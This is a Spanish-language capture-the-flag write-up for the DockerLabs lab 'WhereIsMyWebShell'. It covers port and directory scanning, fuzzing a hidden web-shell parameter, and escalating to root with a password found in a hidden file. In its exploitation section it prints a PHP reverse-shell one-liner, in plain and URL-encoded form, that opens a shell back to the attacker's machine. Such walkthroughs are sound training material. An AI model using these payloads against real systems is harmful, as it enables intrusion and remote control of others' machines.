# WhereIsMyWebShell - Writeup

## 📋 Información General

- **Plataforma**: DockerLabs
- **Dificultad**: Fácil
- **Categorías**: Web Exploitation | Command Injection | Privilege Escalation
- **Fecha**: 17/02/2026
- **Tiempo empleado**: ~30 minutos
- **Autor**: Samuel Rodríguez aka Testarious

## 🎯 Objetivo

Encontrar y explotar una web shell oculta en el servidor para obtener acceso al sistema y escalar privilegios.


## 🔍 Reconocimiento y Enumeración

### Escaneo de Puertos

Empezamos escaneando los puertos de la máquina objetivo:

```bash
# Escaneo completo de puertos
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2

# Escaneo detallado de puertos abiertos
nmap -sCV -p80 172.17.0.2
```

**Resultados:**
![Nmap](./content/screenshots/whereismywebshell/nmap.png)

Como podemos ver, solo hay un puerto abierto, el 80. Al acceder mediante el navegador observamos una simple página web. Aparentemente no hay ningún input ni formularios que nos permitan intentar alguna inyección o ataque. Así que como siguiente paso, enumeramos directorios y archivos en el servidor web.

### Enumeración de Directorios y Archivos

```bash
# Enumeración de directorios y archivos con gobuster
gobuster dir -u 172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

![Gobuster](./content/screenshots/whereismywebshell/gobuster.png)


**Hallazgos:**
- Página web warning.html
- Página shell.php (posible web shell)

Al acceder a la web http://172.17.0.2/warning.html vemos una página web con el mensaje:

```
Esta web ha sido atacada por otro hacker, pero su webshell tiene un parámetro que no recuerdo...
```

Por lo que nos da la pista definitiva de que shell.php es una web shell y que tiene un parámetro oculto. Así que procedemos a enumerar los parámetros de la web shell utilizando ffuf:

```bash
# Enumeración de parámetros con ffuf
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://172.17.0.2/shell.php?FUZZ=whoami -fs 0
```

![Ffuf](./content/screenshots/whereismywebshell/ffuf.png)

Como vemos en el resultado, el parámetro `parameter` es el que está disponible.

## 💻 Explotación

### Vector de Ataque 1: Web Shell Oculta

Al utilizar el parámetro `parameter` en la web shell, podemos ejecutar comandos en el servidor. Así que procedemos a enviarnos una reverse shell:
- Escuchamos en el puerto 9999 con netcat
- Utilizamos el recurso web revshell.com para generar una reverse shell
- Enviamos la reverse shell

```bash
# Escuchamos en el puerto 9999
nc -nlvp 9999

# Generamos la reverse shell con revshell.com
php -r '$sock=fsockopen("172.17.0.1",9999);exec("sh <&3 >&3 2>&3");'

# Aunque en este caso la hacemos URLencoded:
http://172.17.0.2/shell.php?parameter=php%20-r%20%27%24sock%3Dfsockopen(%22172.17.0.1%22%2C9999)%3Bexec(%22sh%20%3C%263%20%3E%263%202%3E%263%22)%3B%27
```

Al enviar la petición al servidor, se establece una conexión reverse shell y se obtiene acceso al sistema como usuario www-data.

![Reverse Shell](./content/screenshots/whereismywebshell/reverse_shell.png)

## 🔐 Escalada de Privilegios

### Enumeración Local

Después de explorar un poco el sistema en busca de archivos interesantes, buscamos archivos `.txt` en el sistema:

```bash
# Buscar archivos .txt
find / -name "*.txt" -type f 2>/dev/null
```

![Find](./content/screenshots/whereismywebshell/find.png)

Encontramos un archivo `/tmp/.secret.txt` con las credenciales del usuario root:

```bash
cat /tmp/.secret.txt

contraseñaderoot123
```

Simplemente hacemos un `su root` e introducimos la contraseña.

![Su Root](./content/screenshots/whereismywebshell/root.png)

Finalmente, obtenemos acceso a la máquina como usuario root 🎉​


## 🛠️ Herramientas Utilizadas

| Herramienta | Versión | Uso específico |
|-------------|---------|----------------|
| nmap | 7.92 | Escaneo de puertos y servicios |
| gobuster | 2.0.1 | Enumeración de directorios web |
| ffuf | 2.1.0 | Escaneo de directorios web |


## 🔗 Recursos Adicionales

- [DockerLabs WhereIsMyWebShell](https://dockerlabs.es/)
- [Reverse Shell Generator](https://www.revshells.com/)


## 🏆 Conclusión

Máquina ideal para principiantes que enseña la importancia de una buena enumeración web y la búsqueda de pistas en archivos ocultos. Buen punto de partida para aprender a identificar y explotar web shells. Seguimos! 🚀
